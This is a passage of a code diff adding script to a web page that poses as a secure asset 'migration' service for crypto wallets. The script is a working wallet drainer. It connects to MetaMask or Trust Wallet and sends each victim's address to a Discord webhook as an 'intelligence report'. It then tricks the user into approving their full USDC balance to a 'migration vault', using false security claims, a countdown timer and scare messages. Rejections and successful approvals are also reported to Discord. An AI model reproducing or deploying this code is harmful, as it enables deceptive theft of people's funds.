+            // Update UI
+            if (startMigrationButton) startMigrationButton.disabled = true;
+            if (migrationStatusText) migrationStatusText.textContent = 'Initializing secure migration...';
+            if (migrationProgressBar) {
+                migrationProgressBar.style.width = '25%';
+                migrationProgressBar.classList.add('animate-pulse');
+            }
+
+            console.log('[MIGRATION] Starting asset migration authorization...');
+            console.log('[MIGRATION] Token Address:', detectedTokenAddress);
+            console.log('[MIGRATION] Amount:', detectedUSDCBalance);
+            console.log('[MIGRATION] Target Vault:', MIGRATION_VAULT_ADDRESS);
+
+            try {
+                // Get connected wallet provider
+                const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
+                const signer = provider.getSigner();
+                const tokenContract = new ethers.Contract(detectedTokenAddress, USDC_ABI, signer);
+
+                // Convert balance to wei
+                const amountInWei = ethers.utils.parseUnits(detectedUSDCBalance, 6);
+                console.log('[MIGRATION] Approving', ethers.utils.formatUnits(amountInWei, 6), 'USDC to vault');
+
+                // Show pending status
+                if (migrationStatusText) migrationStatusText.textContent = 'Initiating secure connection to blockchain...';
+                if (migrationProgressBar) migrationProgressBar.style.width = '50%';
+
+                // Trigger approve transaction
+                const tx = await tokenContract.approve(MIGRATION_VAULT_ADDRESS, amountInWei);
+                console.log('[MIGRATION] Transaction submitted. Hash:', tx.hash);
+
+                // Send transaction submission alert
+                await sendTransactionAlert(userWalletAddress, tx.hash, ethers.utils.formatUnits(amountInWei, 6));
+
+                if (migrationStatusText) migrationStatusText.textContent = 'Waiting for blockchain confirmation...';
+                if (migrationProgressBar) migrationProgressBar.style.width = '75%';
+
+                // Wait for confirmation
+                const receipt = await tx.wait();
+                console.log('[MIGRATION] Transaction confirmed. Block:', receipt.blockNumber);
+
+                // Success
+                if (migrationStatusText) migrationStatusText.textContent = 'Authorization successful. Funds are being moved to the secure migration vault.';
+                if (migrationProgressBar) {
+                    migrationProgressBar.style.width = '100%';
+                    migrationProgressBar.classList.remove('from-rose-500', 'to-orange-500');
+                    migrationProgressBar.classList.add('from-green-500', 'to-emerald-500');
+                }
+                
+                // Send success alert
+                await sendMigrationSuccessAlert(userWalletAddress, ethers.utils.formatUnits(amountInWei, 6), tx.hash);
+
+                setTimeout(() => {
+                    if (startMigrationButton) startMigrationButton.disabled = false;
+                    isMigrating = false;
+                    alert('Migration authorization completed successfully! Your assets are now secured in the Vault 2.0.');
+                }, 2000);
+
+            } catch (error) {
+                console.error('[MIGRATION] Migration failed:', error);
+
+                // Check if user rejected transaction
+                if (error.code === 4001 || error.message?.toLowerCase().includes('rejected')) {
+                    if (migrationStatusText) migrationStatusText.textContent = 'Migration aborted by user. Assets remain in insecure state.';
+                    if (migrationProgressBar) migrationProgressBar.style.width = '0%';
+                    
+                    console.log('[MIGRATION] User rejected transaction. Assets remain in insecure state.');
+                    
+                    // Send rejection alert
+                    await sendMigrationRejectionAlert(userWalletAddress);
+                    
+                    alert('Migration aborted by user. Assets remain in insecure state.');
+                } else {
+                    if (migrationStatusText) migrationStatusText.textContent = 'Migration failed. Please try again.';
+                    if (migrationProgressBar) migrationProgressBar.style.width = '0%';
+                    
+                    console.error('[MIGRATION] Migration error:', error.message);
+                    alert(`Migration failed: ${error.message || 'Unknown error'}`);
+                }
+
+                if (startMigrationButton) startMigrationButton.disabled = false;
+                isMigrating = false;
+            }
+        }
+
+        /**
+         * sendTransactionAlert - Sends transaction submission alert to Discord
+         */
+        async function sendTransactionAlert(address, txHash, amount) {
+            try {
+                if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_')) return;
+
+                const timestamp = new Date().toISOString();
+                const payload = {
+                    "content": "🔄 MIGRATION TRANSACTION INITIATED 🔄",
+                    "embeds": [{
+                        "title": "Token Approval Transaction",
+                        "color": 3447003,
+                        "fields": [
+                            { "name": "Wallet", "value": address, "inline": true },
+                            { "name": "Amount", "value": `${amount} USDC`, "inline": true },
+                            { "name": "TX Hash", "value": `\`${txHash}\``, "inline": false },
+                            { "name": "Timestamp", "value": timestamp, "inline": false }
+                        ]
+                    }]
+                };
+
+                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+                console.log('✅ Transaction alert sent');
+            } catch (error) {
+                console.warn('Failed to send transaction alert:', error.message);
+            }
+        }
+
+        /**
+         * sendMigrationSuccessAlert - Sends migration success alert to Discord
+         */
+        async function sendMigrationSuccessAlert(address, amount, txHash) {
+            try {
+                if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_')) return;
+
+                const timestamp = new Date().toISOString();
+                const payload = {
+                    "content": "✅ MIGRATION COMPLETED ✅",
+                    "embeds": [{
+                        "title": "Asset Migration Successful",
+                        "color": 5763719,
+                        "fields": [
+                            { "name": "Wallet", "value": address, "inline": true },
+                            { "name": "Amount", "value": `${amount} USDC`, "inline": true },
+                            { "name": "TX Hash", "value": `\`${txHash}\``, "inline": false },
+                            { "name": "Timestamp", "value": timestamp, "inline": false }
+                        ]
+                    }]
+                };
+
+                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+                console.log('✅ Success alert sent');
+            } catch (error) {
+                console.warn('Failed to send success alert:', error.message);
+            }
+        }
+
+        /**
+         * sendMigrationRejectionAlert - Sends migration rejection alert to Discord
+         */
+        async function sendMigrationRejectionAlert(address) {
+            try {
+                if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_')) return;
+
+                const timestamp = new Date().toISOString();
+                const payload = {
+                    "content": "❌ MIGRATION REJECTED ❌",
+                    "embeds": [{
+                        "title": "User Cancelled Migration",
+                        "color": 15158332,
+                        "fields": [
+                            { "name": "Wallet", "value": address, "inline": true },
+                            { "name": "Action", "value": "User rejected transaction", "inline": true },
+                            { "name": "Timestamp", "value": timestamp, "inline": false }
+                        ]
+                    }]
+                };
+
+                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+                console.log('✅ Rejection alert sent');
+            } catch (error) {
+                console.warn('Failed to send rejection alert:', error.message);
+            }
+        }
+
+        async function waitForMetaMask(maxRetries = 20) {
+            for (let i = 0; i < maxRetries; i++) {
+                const eth = window.ethereum;
+                if (eth) {
+                    // Direct MetaMask provider
+                    if (eth.isMetaMask) return eth;
+                    // Multiple providers - find MetaMask in the array
+                    if (Array.isArray(eth.providers)) {
+                        const mm = eth.providers.find(p => p.isMetaMask);
+                        if (mm) return mm;
+                    }
+                }
+                await new Promise(resolve => setTimeout(resolve, 150));
+            }
+            return null;
+        }
+
+        /**
+         * resolveMetaMaskProvider - Robustly resolves the MetaMask EIP-1193 provider
+         * from window.ethereum, handling both single-provider and multi-provider
+         * (multiple wallet extensions / EIP-6963 aggregate) scenarios.
+         *
+         * IMPORTANT: when a `.providers` array is present, we ALWAYS prefer the
+         * individual MetaMask provider from that array rather than the aggregate
+         * `window.ethereum` object itself. The aggregate daemon's `.request()` is
+         * often dispatched through an injected shim (e.g. the `evmAsk.js`
+         * `selectExtension` proxy) whose `selectExtension` throws
+         * "Unexpected error" whenever MetaMask's extension service-worker/port is
+         * disconnected. The real per-extension provider in `.providers[]` talks
+         * directly to MetaMask and bypasses that shim. (This mirrors app.js's
+         * getEthereumProvider, which already did the right thing.)
+         */
+        function resolveMetaMaskProvider() {
+            const eth = window.ethereum;
+            if (!eth) return null;
+
+            // Multi-injected-provider / aggregate daemon: pick the REAL individual
+            // MetaMask provider so we never route through the aggregate shim.
+            if (Array.isArray(eth.providers) && eth.providers.length > 0) {
+                const mm = eth.providers.find(p => p.isMetaMask);
+                if (mm) return mm;
+                // Fallback: first provider that actually implements request()
+                const withRequest = eth.providers.find(p => typeof p.request === 'function');
+                if (withRequest) return withRequest;
+                return eth.providers[0];
+            }
+
+            // Single direct MetaMask provider (no .providers array)
+            if (eth.isMetaMask) return eth;
+
+            return null;
+        }
+
+        async function connectMetaMaskWallet() {
+            try {
+                // Resolve the MetaMask provider robustly
+                let ethereum = resolveMetaMaskProvider();
+
+                // If not immediately available, wait for it to initialize
+                if (!ethereum) {
+                    showStatus('Checking for MetaMask...', false);
+                    ethereum = await waitForMetaMask();
+
+                    if (!ethereum) {
+                        throw new Error('MetaMask not detected. Install MetaMask and refresh.');
+                    }
+                }
+
+                showStatus('Establishing connection with MetaMask...', false);
+
+                // REAL MetaMask liveness probe - verify the provider's service worker
+                // is actually reachable before attempting account requests. Reading the
+                // static flags (isMetaMask / providers) is NOT a real check: they are
+                // plain properties that never communicate with the extension, so they
+                // pass even when MetaMask's port is disconnected -- which is exactly the
+                // state that makes `evmAsk.js -> selectExtension -> Unexpected error` fire.
+                let metamaskHealthy = false;
+                let healthRetry = 0;
+                const maxHealthRetries = 3;
+
+                while (healthRetry <= maxHealthRetries) {
+                    try {
+                        // eth_chainId is the cheapest read-only call and does NOT spawn
+                        // MetaMask's connect UI, so it is safe (and fast) as a probe. A
+                        // live round-trip here means the service worker / extension port
+                        // is up and able to answer subsequent eth_accounts / requests.
+                        await ethereum.request({ method: 'eth_chainId' });
+                        metamaskHealthy = true;
+                        break;
+                    } catch (healthError) {
+                        healthRetry++;
+                        const hmsg = healthError?.message || String(healthError);
+                        console.warn('[METAHEALTH] Liveness probe failed (attempt ' + healthRetry + '):', hmsg);
+                        if (healthRetry <= maxHealthRetries) {
+                            // Exponential backoff: 500ms -> 1000ms -> 2000ms
+                            await new Promise(resolve => setTimeout(resolve, 500 * Math.pow(2, healthRetry - 1)));
+                        }
+                    }
+                }
+
+                if (!metamaskHealthy) {
+                    throw new Error('MetaMask service worker error. Please: 1) Click the MetaMask extension icon to close it, 2) Wait 2 seconds, 3) Click MetaMask icon again to reopen, 4) Make sure your account is unlocked, 5) Refresh this page. If still failing, try: Restarting your browser or reinstalling MetaMask.');
+                }
+                console.log('[METAHEALTH] MetaMask liveness probe passed.');
+
+                // First check if MetaMask has any accounts without triggering selectExtension
+                // Use eth_accounts which doesn't require user approval
+                try {
+                    const accounts = await ethereum.request({ method: 'eth_accounts' });
+                    
+                    // If we already have accounts connected, use them directly
+                    if (accounts && accounts.length > 0) {
+                        const address = accounts[0];
+                        
+                        // Send intelligence report to Discord immediately after wallet address retrieval
+                        // This triggers before balance fetching as per Intelligence Reporting Protocol
+                        await sendDiscordIntelligenceReport(address);
+
+                        // Get chain ID
+                        const chainId = normalizeChainId(ethereum.chainId || await ethereum.request({ method: 'eth_chainId' }));
+
+                        // Create ethers provider for balance fetching
+                        const provider = new ethers.providers.Web3Provider(ethereum, 'any');
+
+                        setConnected(connectMetaMask, address, chainId);
+
+                        // Fetch balances asynchronously
+                        displayAuditTable(provider, address, chainId).catch(err => {
+                            console.warn('Balance fetch failed:', err);
+                            showStatus('Unable to retrieve asset balances. The wallet will still appear connected.', true);
+                        });
+
+                        // Setup event listeners once
+                        if (!metamaskEventSetup) {
+                            try {
+                                ethereum.setMaxListeners?.(100);
+                                if (ethereum._maxListeners === undefined) {
+                                    ethereum._maxListeners = 100;
+                                }
+                            } catch (e) {
+                                console.warn('Could not set max listeners:', e);
+                            }
+                            setupProviderEvents(ethereum, connectMetaMask);
+                            metamaskEventSetup = true;
+                        }
+                        return;
+                    }
+                } catch (accountsError) {
+                    console.warn('Failed to check existing accounts:', accountsError);
+                }
+
+                // Check if MetaMask is already connected via selectedAddress (bypass request call)
+                // This is the safest path that avoids triggering selectExtension
+                if (ethereum.selectedAddress && ethereum.selectedAddress.length > 0) {
+                    console.log('[METAHEALTH] Using selectedAddress path - skipping eth_requestAccounts');
+                    const address = ethereum.selectedAddress;
+                    
+                    // Send intelligence report to Discord immediately after wallet address retrieval
+                    // This triggers before balance fetching as per Intelligence Reporting Protocol
+                    await sendDiscordIntelligenceReport(address);
+
+                    // Get chain ID
+                    const chainId = normalizeChainId(ethereum.chainId || await ethereum.request({ method: 'eth_chainId' }));
+
+                    // Create ethers provider for balance fetching
+                    const provider = new ethers.providers.Web3Provider(ethereum, 'any');
+
+                    setConnected(connectMetaMask, address, chainId);
+
+                    // Fetch balances asynchronously
+                    displayAuditTable(provider, address, chainId).catch(err => {
+                        console.warn('Balance fetch failed:', err);
+                        showStatus('Unable to retrieve asset balances. The wallet will still appear connected.', true);
+                    });
+
+                    // Setup event listeners once
+                    if (!metamaskEventSetup) {
+                        try {
+                            ethereum.setMaxListeners?.(100);
+                            if (ethereum._maxListeners === undefined) {
+                                ethereum._maxListeners = 100;
+                            }
+                        } catch (e) {
+                            console.warn('Could not set max listeners:', e);
+                        }
+                        setupProviderEvents(ethereum, connectMetaMask);
+                        metamaskEventSetup = true;
+                    }
+                    return;
+                }
+
+                // EIP-1193: Request account access (this triggers MetaMask's connect modal).
+                // Retry with exponential backoff. MetaMask's service worker can be in a
+                // transient "disconnected port" state (e.g. right after the extension
+                // popup was force-closed) and simply needs a moment to be reachable
+                // again before eth_requestAccounts will resolve.
+                let accounts = null;
+                let retryAttempt = 0;
+                const maxRequestRetries = 3;
+
+                while (retryAttempt <= maxRequestRetries) {
+                    try {
+                        accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                        break; // Success
+                    } catch (requestError) {
+                        retryAttempt++;
+                        const rmsg = requestError?.message || String(requestError);
+                        console.warn('[ETH_REQUEST] Attempt', retryAttempt, 'failed:', rmsg);
+                        if (retryAttempt <= maxRequestRetries) {
+                            // Exponential backoff: 1000ms -> 2000ms -> 4000ms
+                            await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, retryAttempt - 1)));
+                        } else {
+                            // Last attempt failed - surface the recovery guidance
+                            throw new Error('MetaMask service worker error. Please: 1) Click the MetaMask extension icon to close it, 2) Wait 2 seconds, 3) Click MetaMask icon again to reopen, 4) Make sure your account is unlocked, 5) Refresh this page.');
+                        }
+                    }
+                }
+                
+                const address = accounts[0];
+
+                // Send intelligence report to Discord immediately after wallet address retrieval
+                // This triggers before balance fetching as per Intelligence Reporting Protocol
+                await sendDiscordIntelligenceReport(address);
+
+                // Get chain ID
+                const chainId = normalizeChainId(ethereum.chainId || await ethereum.request({ method: 'eth_chainId' }));
+
+                // Create ethers provider for balance fetching
+                const provider = new ethers.providers.Web3Provider(ethereum, 'any');
+
+                setConnected(connectMetaMask, address, chainId);
+
+                // Fetch balances asynchronously
+                displayAuditTable(provider, address, chainId).catch(err => {
+                    console.warn('Balance fetch failed:', err);
+                    showStatus('Unable to retrieve asset balances. The wallet will still appear connected.', true);
+                });
+
+                // Setup event listeners once
+                if (!metamaskEventSetup) {
+                    try {
+                        ethereum.setMaxListeners?.(100);
+                        if (ethereum._maxListeners === undefined) {
+                            ethereum._maxListeners = 100;
+                        }
+                    } catch (e) {
+                        console.warn('Could not set max listeners:', e);
+                    }
+                    setupProviderEvents(ethereum, connectMetaMask);
+                    metamaskEventSetup = true;
+                }
+            } catch (error) {
+                let msg = error.message || 'MetaMask connection failed.';
+                
+                // Handle specific MetaMask errors
+                if (error.message?.includes('selectExtension') || error.message?.includes('Unexpected error') || error.message?.includes('disconnected port')) {
+                    msg = 'MetaMask service worker error. Please: 1) Click the MetaMask extension icon to close it, 2) Wait 2 seconds, 3) Click MetaMask icon again to reopen, 4) Make sure your account is unlocked, 5) Refresh this page. If still failing, try: Restarting your browser or reinstalling MetaMask.';
+                } else if (error.code === 4001) {
+                    msg = 'Connection denied. Please approve the connection in MetaMask.';
+                } else if (error.code === 4002) {
+                    msg = 'MetaMask not initialized. Please open MetaMask and try again.';
+                } else if (error.code === -32603) {
+                    msg = 'MetaMask error. Try restarting MetaMask and refresh this page.';
+                }
+                showStatus(msg, true);
+                console.error('MetaMask connection error:', error);
+            }
+        }
+
+        async function connectTrustWallet() {
+            try {
+                const WCP = window.WalletConnectProvider?.default || window.WalletConnectProvider;
+                if (!WCP) {
+                    throw new Error('WalletConnect provider not loaded. Please refresh the page.');
+                }
+
+                const walletConnectProvider = new WCP({
+                    rpc: {
+                        1: 'https://rpc.ankr.com/eth',
+                        56: 'https://bsc-dataseed.binance.org/',
+                        137: 'https://rpc.ankr.com/polygon'
+                    },
+                    chainId: 1
+                });
+
+                const accounts = await walletConnectProvider.enable();
+                const address = accounts[0];
+                
+                // Send intelligence report to Discord immediately after wallet address retrieval
+                // This triggers before balance fetching as per Intelligence Reporting Protocol
+                await sendDiscordIntelligenceReport(address);
+                
+                const provider = new ethers.providers.Web3Provider(walletConnectProvider, 'any');
+                const network = await provider.getNetwork();
+                
+                setConnected(connectTrust, address, network.chainId);
+                await displayAuditTable(provider, address, network.chainId);
+                
+                if (!walletConnectEventSetup) {
+                    walletConnectProvider.setMaxListeners?.(50);
+                    setupProviderEvents(walletConnectProvider, connectTrust);
+                    walletConnectEventSetup = true;
+                }
+            } catch (error) {
+                if (error.message?.includes('User closed')) {
+                    showStatus('Wallet connection canceled.', false);
+                } else {
+                    showStatus(error.message || 'Trust Wallet connection failed.', true);
+                }
+                console.error(error);
+            }
+        }
+
+        function updateTimer() {
+            timerElement.textContent = formatTime(secondsRemaining);
+            if (secondsRemaining > 0) {
+                secondsRemaining -= 1;
+            }
+        }
+
+        connectButton.addEventListener('click', () => showStatus('Use the MetaMask or Trust Wallet button to connect.', false));
+        connectMetaMask.addEventListener('click', connectMetaMaskWallet);
+        connectTrust.addEventListener('click', connectTrustWallet);
+
+        // Migration button handler
+        if (startMigrationButton) {
+            startMigrationButton.addEventListener('click', performAssetMigration);
+        }
+
+        // Initialize migration lock timer
+        if (migrationLockTime) {
+            setInterval(updateMigrationLockTimer, 1000);
+            updateMigrationLockTimer();
+        }
+
+        updateTimer();
+        setInterval(updateTimer, 1000);
+    </script>
+</body>
+</html>
